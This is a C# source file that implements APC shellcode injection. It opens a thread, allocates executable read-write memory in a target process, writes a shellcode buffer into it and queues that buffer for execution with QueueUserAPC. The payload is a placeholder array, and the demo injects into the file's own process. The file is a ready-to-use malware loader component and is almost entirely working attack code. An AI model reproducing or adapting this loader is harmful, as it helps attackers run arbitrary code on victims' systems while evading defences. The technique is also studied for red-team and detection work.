using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace APCInjection
{
    public class APCInjectionTechnique
    {
        [Flags]
        public enum ThreadAccess : UInt32
        {
            TERMINATE = 0x0001,
            SUSPEND_RESUME = 0x0002,
            GET_CONTEXT = 0x0008,
            SET_CONTEXT = 0x0010,
            SET_INFORMATION = 0x0020,
            QUERY_INFORMATION = 0x0040,
            SET_THREAD_TOKEN = 0x0080,
            IMPERSONATE = 0x0100,
            DIRECT_IMPERSONATION = 0x0200,
            THREAD_ALL_ACCESS = 0x1fffff
        }

        [Flags]
        public enum AllocationType
        {
            NULL = 0x0,
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        public enum MemoryProtection : UInt32
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, UInt32 dwThreadId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        public void Run(Process target, byte[] shellcode)
        {
            ProcessThread thread = GetThread(target.Threads);
            IntPtr hThread = OpenThread(ThreadAccess.GET_CONTEXT | ThreadAccess.SET_CONTEXT, false, (UInt32)thread.Id);
            IntPtr pAddr = VirtualAllocEx(target.Handle, IntPtr.Zero, (UInt32)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.PAGE_EXECUTE_READWRITE);
            WriteProcessMemory(target.Handle, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten);
            QueueUserAPC(pAddr, hThread, IntPtr.Zero);
        }

        ProcessThread GetThread(ProcessThreadCollection threads)
        {
            return threads[0];
        }
    }

    public class Program
    {
        static void Main(string[] args)
        {
            byte[] payload = { SHELL_CODE_ARRAY };
            Process target = Process.GetCurrentProcess();
            APCInjectionTechnique t = new APCInjectionTechnique();
            t.Run(target, payload);
        }
    }
}
